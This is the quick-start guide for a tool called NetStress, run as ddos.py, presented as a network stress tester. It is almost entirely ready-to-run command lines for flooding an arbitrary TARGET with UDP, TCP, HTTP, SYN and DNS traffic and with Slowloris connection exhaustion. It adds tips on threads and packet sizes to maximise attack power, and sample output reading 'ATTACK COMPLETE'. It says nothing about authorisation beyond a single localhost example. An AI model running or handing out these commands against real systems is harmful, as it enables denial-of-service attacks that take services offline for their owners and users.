<h1 align="center">🚀 Quick Start Guide</h1>

<p align="center">
  <b>Get up and running with NetStress in under 5 minutes</b>
</p>

---

## 📋 Table of Contents

- [Prerequisites](#-prerequisites)
- [Installation](#-installation)
- [Your First Test](#-your-first-test)
- [Understanding Output](#-understanding-output)
- [Common Commands](#-common-commands)
- [Next Steps](#-next-steps)

---

## ✅ Prerequisites

Before you begin, ensure you have:

| Requirement | Minimum                                | Recommended      |
| ----------- | -------------------------------------- | ---------------- |
| **Python**  | 3.8                                    | 3.10+            |
| **RAM**     | 2 GB                                   | 4 GB+            |
| **OS**      | Windows 10 / Linux 4.4+ / macOS 10.14+ | Latest version   |
| **Network** | Any active interface                   | Wired connection |

---

## 📦 Installation

### Step 1: Clone the Repository

```bash
git clone https://github.com/Destroyer-official/NetStress.git
cd NetStress
```

### Step 2: Install Dependencies

<details>
<summary><b>🐧 Linux</b></summary>

```bash
pip3 install -r requirements.txt
```

</details>

<details>
<summary><b>🪟 Windows</b></summary>

```powershell
# Run PowerShell as Administrator
pip install -r requirements.txt
```

</details>

<details>
<summary><b>🍎 macOS</b></summary>

```bash
pip3 install -r requirements.txt
```

</details>

### Step 3: Verify Installation

```bash
python ddos.py --status
```

**Expected Output:**

```
╔══════════════════════════════════════════════════════════════╗
║              NetStress System Status                         ║
╠══════════════════════════════════════════════════════════════╣
║  Platform: Linux 5.15.0                                      ║
║  CPU Cores: 8                                                ║
║  Root/Admin: No                                              ║
║                                                              ║
║  Backend Capabilities:                                       ║
║    sendmmsg: Yes                                             ║
║    Raw Sockets: No (requires root)                           ║
╚══════════════════════════════════════════════════════════════╝
```

---

## 🎯 Your First Test

### Safe Test (Localhost)

Test against your own machine first:

```bash
python ddos.py -i 127.0.0.1 -p 9999 -t UDP -d 10
```

This sends UDP packets to localhost port 9999 for 10 seconds.

### Basic Test Syntax

```bash
python ddos.py -i <TARGET> -p <PORT> -t <PROTOCOL> -d <DURATION>
```

| Parameter | Description           | Example              |
| --------- | --------------------- | -------------------- |
| `-i`      | Target IP or hostname | `192.168.1.100`      |
| `-p`      | Target port           | `80`                 |
| `-t`      | Protocol type         | `UDP`, `TCP`, `HTTP` |
| `-d`      | Duration in seconds   | `60`                 |

### Example: UDP Flood

```bash
python ddos.py -i 192.168.1.100 -p 80 -t UDP -d 60
```

---

## 📊 Understanding Output

When you run a test, you'll see real-time statistics:

```
╔══════════════════════════════════════════════════════════════╗
║              NETSTRESS FRAMEWORK                             ║
║     High-Performance Network Stress Testing                  ║
╠══════════════════════════════════════════════════════════════╣
║  Target: 192.168.1.100:80                                    ║
║  Protocol: UDP                                               ║
║  Duration: 60s | Threads: 4 | Size: 1472                     ║
╚══════════════════════════════════════════════════════════════╝

Stats: 125,432 pps | 1,476.80 Mbps | Errors: 0 (0.00%)
Stats: 128,901 pps | 1,517.62 Mbps | Errors: 0 (0.00%)
Stats: 126,234 pps | 1,486.24 Mbps | Errors: 0 (0.00%)
```

### Output Fields Explained

| Field      | Meaning             | Good Value               |
| ---------- | ------------------- | ------------------------ |
| **pps**    | Packets per second  | Higher = better          |
| **Mbps**   | Megabits per second | Depends on goal          |
| **Errors** | Failed packet sends | 0% ideal, <5% acceptable |

### Final Report

```
════════════════════════════════════════════════════════════════
ATTACK COMPLETE
════════════════════════════════════════════════════════════════
Duration: 60.00s
Packets: 7,526,040
Data: 11.08 GB
PPS: 125,434
Bandwidth: 1,476.80 Mbps
Errors: 0 (0.00%)
════════════════════════════════════════════════════════════════
```

---

## 📝 Common Commands

### Check System Capabilities

```bash
python ddos.py --status
```

### UDP Flood (Bandwidth Test)

```bash
python ddos.py -i TARGET -p 80 -t UDP -d 60
```

### TCP Flood (Connection Test)

```bash
python ddos.py -i TARGET -p 80 -t TCP -d 60
```

### HTTP Flood (Web Server Test)

```bash
python ddos.py -i TARGET -p 80 -t HTTP -d 60
```

### More Threads (More Power)

```bash
python ddos.py -i TARGET -p 80 -t UDP -x 8 -d 60
```

### Smaller Packets (Higher PPS)

```bash
python ddos.py -i TARGET -p 80 -t UDP -s 64 -d 60
```

### SYN Flood (Requires Root)

```bash
sudo python ddos.py -i TARGET -p 80 -t TCP-SYN -d 60
```

### Slowloris (Connection Exhaustion)

```bash
python ddos.py -i TARGET -p 80 -t SLOW -x 500 -d 300
```

---

## 🎓 Protocol Selection Guide

| Your Goal                | Recommended Protocol | Command             |
| ------------------------ | -------------------- | ------------------- |
| Test bandwidth capacity  | UDP                  | `-t UDP`            |
| Test connection handling | TCP                  | `-t TCP`            |
| Test web server          | HTTP                 | `-t HTTP`           |
| Test HTTPS server        | HTTPS                | `-t HTTPS`          |
| Test DNS server          | DNS                  | `-t DNS`            |
| Exhaust connections      | SLOW                 | `-t SLOW -x 500`    |
| Test firewall            | TCP-SYN              | `-t TCP-SYN` (root) |

---

## ⚡ Performance Tips

### 1. Use More Threads

```bash
# Default: 4 threads
python ddos.py -i TARGET -p 80 -t UDP -x 8
```

**Thread Recommendations:**
| CPU Cores | Recommended Threads |
|-----------|-------------------|
| 2 | 2-4 |
| 4 | 4-8 |
| 8+ | 8-16 |

### 2. Adjust Packet Size

```bash
# Small packets = Higher PPS
python ddos.py -i TARGET -p 80 -t UDP -s 64

# Large packets = More bandwidth
python ddos.py -i TARGET -p 80 -t UDP -s 1472
```

### 3. Install Native Engine

For 10x+ performance improvement:

```bash
python scripts/install_native.py
```

---

## 🔧 Troubleshooting

### "Permission denied"

```bash
# Run with root/admin privileges
sudo python ddos.py ...  # Linux/macOS
# Run as Administrator on Windows
```

### "Module not found"

```bash
pip install -r requirements.txt --force-reinstall
```

### Low Performance

1. Check status: `python ddos.py --status`
2. Use more threads: `-x 8`
3. Install native engine: `python scripts/install_native.py`

---

## 📚 Next Steps

<table>
<tr>
<td width="33%" align="center">

### 📖 Learn More

[CLI Reference](CLI_USAGE.md)

All command options

</td>
<td width="33%" align="center">

### ⚡ Optimize

[Performance Guide](PERFORMANCE_TUNING.md)

Get maximum speed

</td>
<td width="33%" align="center">

### ❓ Get Help

[FAQ](FAQ.md)

Common questions

</td>
</tr>
</table>

---

<p align="center">
  <b>Ready to dive deeper? Check out the <a href="CLI_USAGE.md">full CLI reference</a>!</b>
</p>
